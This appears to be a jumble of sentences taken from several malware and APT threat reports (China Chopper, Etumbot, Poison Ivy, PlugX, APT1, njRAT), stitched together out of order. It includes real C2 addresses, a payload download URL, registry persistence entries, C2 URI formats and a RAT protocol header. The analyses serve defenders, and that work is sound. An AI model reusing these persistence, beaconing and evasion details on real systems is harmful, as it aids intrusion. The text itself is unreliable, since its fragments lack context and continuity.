`` Server-side Payload Component '' on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX .
Running the Web shell through the virus-scanning website `` No Virus Thanks '' shows a detection rate of 0 out of 14 , indicating that most , if not all , anti-virus tools would miss the Web shell on an infected system .
Because the strings are not encoded , examining them in the unpacked binary exposes how the backdoor communicates .
China Chopper can run on any Web server capable of running JSP , ASP , ASPX , PHP , or CFM-the majority of Web application languages .
In addition to vulnerability hunting , China Chopper has excellent CnC features when combining the client and payload , include the following : • File Management ( File explorer ) • Database Management ( DB client ) • Virtual Terminal ( Command shell ) In China Chopper 's main window , right-clicking one of the target URLs brings up a list of possible actions ( see Figure 7 ) .
PEiD ( a free tool for detecting packers , cryptors , and compilers found in PE executable files ) , reveals that the unpacked client binary was written in Microsoft Visual C++ 6.0 , as shown in Figure 2 .
To find the ASPX shell , modify the regex to fit the syntax of the ASPX shell as shown : Researchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command with some extended options to help identify Web files to run the regex command against ( see Figure 28 ) .
The findstr command runs as follows : These examples show detection in the PHP shell .
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .
[ 6 ] Below are some of the names of Etumbot installers using RTLO successfully : As the backdoor executes from our previous example , C : \DOCUME~1\User\LOCALS~1\Temp\ kb71271.log is created and contains the following registry file to make the malware persistent : [ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ] `` JavaSvc '' = '' C : \\Documents and Settings\\User\\Application Data\\JAVA\\JavaSvc.exe '' The dropper then calls regedit with kb71271.log as a parameter to modify the registry .
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .
For example , both malware families have been seen using the same ka4281x3.log and kb71271.log files , both families have been observed calling back to the same Command & Control servers and have been used to target similar victim populations with similar attack methodologies .
When executed , the dropper loads up a resource named `` BINARY '' from the resource section then creates the directory C : \Documents and Settings\User\Application Data\JAVA , then creates a temporary file C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C : \Documents and Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource .
The data is sent back to the C & C via the URI /article/30441/Review.asp ? id= < encoded computer name > & & date= < file chunk data > .
This dropper drops a decoy document and the backdoor , named sysupdate.exe in this instance .
Data from the file is read in 2000 byte chunks , RC4 encrypted and then url-safe base64 encoded .
When a READFILE command is received from the C & C , the bot makes an initial call to /manage/asp/item.asp ? id= < encrypted computer name > & & mux= < encrypted total file size > and checks for the presence of `` I 'm Ready '' in the response from the C & C .
This file , JavaSvc.exe , is the backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 ) .
Once the server executes on a target 's endpoint , it connects to a PIVY client installed on the attacker 's machine , giving the attacker control of the target system .
The tools are available for download at the following locations : • https : //github.com/fireeye/pycommands • https : //github.com/fireeye/chopshop By tracking the PIVY server activity , security professionals can find these telltale indicators : • The domains and IPs used for Command and Control ( CnC ) • The attacker 's PIVY process mutex • The attacker 's PIVY password • The launcher code used in the malware droppers • A timeline of malware activity This report explains how Calamine can connect these and other facets of the attack .
The decoy documents that are opened in exploitation typically contain content that is contextually relevant to both the text of the spear-phishing email and to the interests of the intended target .
Each PIVY server ( the malware that the attacker sends to the target ) can be configured to connect to multiple CnC servers using any TCP port .
Attackers can point and click their way through a compromised network and exfiltrate data .
In the process of building their PIVY servers , attackers leave a number of potentially useful clues , such as : • The domains and IPs used for CnC • The chosen PIVY process mutex • The chosen PIVY password • Launcher code used in the droppers • Timeline of activity • Targets of attack Together , all of these data points can help effectively identify and correlate APT activity that uses the Poison Ivy RAT .
[ 2013-07-03 06:46:29 PDT ] Poison Ivy Version:2.32 [ 2013-07-03 06:46:30 PDT ] *** Host Information*** PI profile ID : mal IP address : 192.168.0.12 Hostname : BLUE Windows User : admin Windows Version : Windows XP Windows Build : 2600 Service Pack : Service Pack 3 Attacker 's View [ 2013-07-03 06:46:36 PDT ] *** Shell Session *** Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985-2001 Microsoft Corp. C : \ > [ 2013-07-03 06:46:42 PDT ] *** Shell Session *** ipconfig [ 2013-07-03 06:46:43 PDT ] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .
The protocol operates by sending encrypted data in chunks that are prepended with the following encrypted 32-byte header : struct PI_chunk_header { int command_id ; int stream_id ; int padded_chunk_size ; int chunk_size ; int decompressed_chunk_size ; long total_stream_size ; int padding ; } ; The PI_chunk_header structure is arranged as follows : command_id-This member identifies which feature of PIVY the chunked data is related to .
The Poison Ivy builder kit allows attackers to customize and build their own PIVY server , which is delivered as mobile code to a target that has been compromised , typically using social engineering .
The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint , which can provide additional telemetry about the threat actor behind the attack .
Frequently the group deploys a remote access trojan ( RAT ) on compromised machines .
These are used both to steal data and credentials from compromised machines , and to use the machine as a staging post to conduct attacks against further systems on the network , allowing the attackers to spread their compromise within the organization .
ESA can block spear phishing emails sent by threat actors as part of their campaign .
The preferred tactics of the group include watering-hole attacks , spear-phishing , and other web-based tactics .
These may be the types of malware that they use , a pattern in the naming conventions of their command and control servers , their choice of victims etc .
CWS or WSA web scanning prevents access to malicious websites , including watering hole attacks , and detects malware used in these attacks .
We have also observed them using SQL injection as part of their attacks , and exploits based on CVE-2012-1889 and CVE-2013-3893 .
We have observed the group to use the following RAT malware : Gh0st RAT ( aka Moudoor ) Poison Ivy ( aka Darkmoon ) HydraQ ( aka 9002 RAT aka McRAT aka Naid ) Hikit ( aka Matrix RAT aka Gaolmay ) Zxshell ( aka Sensode ) DeputyDog ( aka Fexel ) - Using the kumanichi and moon campaign codes Derusbi PlugX ( aka Destroy RAT aka Thoper aka Sogu ) HydraQ and Hikit , according to our data are unique to Group 72 and to two other threat actor groups .
While their operational security is very good , patterns in their domains can be identified such as seemingly naming domains after their intended victim .
ClamAV names and Snort Signature IDs detecting Group 72 RAT malware : Gh0stRat - Win.Trojan.Gh0stRAT , 19484 , 27964 PoisonIVY / DarkMoon - Win.Trojan.DarkMoon , 7816 , 7815 , 7814 , 7813 , 12715 , 12724 Hydraq - Win.Trojan.HyDraq , 16368 , 21304 HiKit - Win.Trojan.HiKit , 30948 Zxshell - Win.Trojan.Zxshell , 32180 , 32181 DeputyDog - Win.Trojan.DeputyDog , 28493 , 29459 Derusbi - Win.Trojan.Derusbi , 20080 Advanced Malware Protection ( AMP ) is ideally suited to detect the sophisticated malware used by this threat actor .
We decoded the commands hosted at these linked projects and found that they issued the following decoded commands : It is likely that other yet to be discovered Kaba variants are configured to connect to these related Google Code projects and then redirect to this list of IP addresses .
Our initial conclusion was that this traffic was the result of malicious actors 'sleeping ' their implants , by pointing their command and control domains at legitimate IP addresses .
We observed this actor target : Google Code Command and Control Furthermore , we also discovered this same actor conducting a parallel campaign that leveraged Google Code for command and control .
On August 1 , 2014 we observed a malicious self-extracting executable ( aka sfxrar ) file downloaded from 211.125.81.203 .
We also noted that this sample was configured to connect directly to 59.125.42.168 – one IP address away from the IP that received traffic from the hijacked www.outlook.com domain .
The sfxrar contained the following files : Setup.exe is a legitimate executable from Kaspersky used to load the Kaba ( aka PlugX ) files – msi.dll and msi.dll.dat .
As we have previously observed malware families that forge their HTTP headers to include legitimate domains in callback traffic , we concluded that the malware in this case was configured in the same way .
Obviously , this configuration does not make a lot of sense , as the actor would not be able to control their implants from anywhere on the Internet since they did not have direct control over these domains – unless the attackers were able to re-route traffic destined for these domains from specific victims .
The actor responsible for this campaign utilized legitimate digital certificates to sign their tools and employed innovative techniques to cloak their command and control traffic .
Analysis of this Kaba sample revealed that it was configured to directly connect to both www.adobe.com and update.adobe.com .
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0Ã-99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX .
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .
Each request results in an HTTP 403 response from the server .
If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on https : //elsa-jp.jp .
Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named superfish.js .
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .
While examining the ATD website , Volexity also observed that the site had a password protected backdoor webshell placed on it .
Filename : main64.dll File size : 15872 bytes MD5 hash : a482a84d13c76b950ce5bc7e75f4edef SHA1 hash : c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes : 64-bit version of malware , which beacons to 58.64.178.77:443 .
Volexity suspects the code was either active at select times and/or was only served to a subset of visitors .
The file css.jpg is of course not a JPEG file , it is an executable that has been encoded with the single-byte XOR key 0xFF .
Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors .
We can not confirm the initial compromised sites , but we noted traffic to several known re-direct sites and the malware was configured to use the same command and control ( C2 ) server .
In contrast to many other APT campaigns , which tend to rely heavily on spear phishing to gain victims , '' th3bug '' is known for compromising legitimate websites their intended visitors are likely to frequent .
The file was named `` PYvBte.jar '' but was actually a Windows executable .
When this file runs , it downloads a payload from uyghurweb.net/player/gmuweb.exe and executes it .
Using Poison Ivy We 've uncovered some new data and likely attribution regarding a series of APT watering hole attacks this past summer .
They were downloaded from one of the download URLs in the below table , but all had the same MD5 and C2 domain .
Watering hole attacks are an increasingly popular component of APT campaigns , as many people are more aware of spear phishing and are less likely to open documents or click on links in unsolicited emails .
All of the malware were variants of the Poison Ivy Remote Administration Tool ( RAT ) and were properly identified as such by our WildFire platform .
Table 2 On July 16 WildFire picked up a malicious executable hosted on uyghurweb.net , a legitimate Uyghur website that was compromised to infect users .
WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems , including : »» Open an interactive command shell ( usually Windows ' cmd.exe ) »» Download and execute a file »» Sleep ( i.e .
This script performs the following functions and saves the results to a text file : »» Display the victim 's network configuration information »» List the services that have started on the victim system »» List currently running processes »» List accounts on the system »» List accounts with administrator privileges »» List current network connections »» List currently connected network shares »» List other systems on the network »» List network computers and accounts according to group ( `` domain controllers , '' `` domain users , '' `` domain admins , '' etc .
The programs acting as APT1 servers have mainly been : ( 1 ) FTP , for transferring files ; ( 2 ) web , primarily for WEBC2 ; ( 3 ) RDP , for remote graphical control of a system ; ( 4 ) HTRAN , for proxying ; and ( 5 ) C2 servers associated with various backdoor families ( covered in Appendix C : The Malware Arsenal ) .
The standard , non-WEBC2 APT1 backdoor typically communicates using the HTTP protocol ( to blend in with legitimate web traffic ) or a custom protocol that the malware authors designed themselves .
In these instances , when a victim backdoor makes contact with a hop , the communications need to be forwarded from the hop to the intruder 's Shanghai system so the backdoor can talk to the C2 server software .
Install new backdoors on multiple systems Throughout their stay in the network ( which could be years ) , APT1 usually installs new backdoors as they claim more systems in the environment .
In almost every case , APT backdoors initiate outbound connections to the intruder 's `` command and control '' ( C2 ) server .
For example , anyone who wants to control a system remotely will likely put functions like `` Upload/download files '' into a backdoor .
'' A WEBC2 backdoor is designed to retrieve a webpage from a C2 server .
Of these , we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses , attackers may dynamically decide where to direct C2 connections from a given backdoor .
0.08 3f2e9251bcd17a2cb17e9202d1b100d3 The following processes were started when the `` Authorization.exe '' malware was executed : C : \Windows\System32\netsh.exe % APPDATA % \msnco.exe The following files were created when the `` Authorization.exe '' malware was executed : % APPDATA % \msnco.exe C : \WINDOWS\Prefetch\AUTHORIZATION.EXE-0AD199D6.pf C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe C : \WINDOWS\Prefetch\NETSH.EXE-085CFFDE.pf C : \WINDOWS\Prefetch\MSNCO.EXE-1616CBE8.pf [ CWD ] \.tmp ( or when created by the original dropper : `` C : \Extracted\.tmp '' ) The following registry values were set by the `` Authorization.exe '' malware when it was executed : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\b6554e5 bcfef391ff7a7ffda58092e10 [ Value : `` [ % APPDATA % ] \msnco.exe '' ..
The following is the network traffic observed : The following table provides information of some of the fields observed in the network traffic : Information sent by the attacker on opened windows in the system could inform him/her of his malware being analyzed and allowed to connect to the C2 node .
] HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Para meters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\ [ % APPDATA % ] \msnco.exe [ Value : [ % APPDATA % ] \msnco.exe : * : Enabled : msnco.exe ] Indicators & Mitigation Strategies : The following three ( 3 ) tables will provide information about some of the malware observed to be njRAT itself or carrier files that once executed dropped njRAT in the victim system .
Through the Command & Control ( CnC ) server software , the attacker has capabilities to create and configure the malware to spread through USB drives .
When the malware is dropped by the `` Authorization form may - 2013 - 115444.scr '' carrier file , the logged keystrokes are stored in : `` C : \Extracted\.tmp '' .
It stores the logged keystrokes in the following file : `` [ CWD ] \.tmp '' .
The encoded data sent by the Victim system was the keystrokes collected into the keylogger file in the Victim .
We will start this section by performing analysis on the following `` njRAT '' sample : - Filename : Authorization.exe - MD5 : 1d3baedd747f6f9bf92c81eb9f63b34b The `` Authorization.exe '' njRAT malware was embedded and dropped in the victim system by the following file : `` Authorization form may - 2013 - 115444.scr '' ( MD5 : 63781fe1932e612c6c29225d25515111 ) .
In this case , an application called BinText ( bintext.exe ) was selected in the Attacker's Machine .
The IP address used by the Command & Control ( C2 ) node appears to be under an IP range owned by : `` Palestinian Internet Services , P. O .
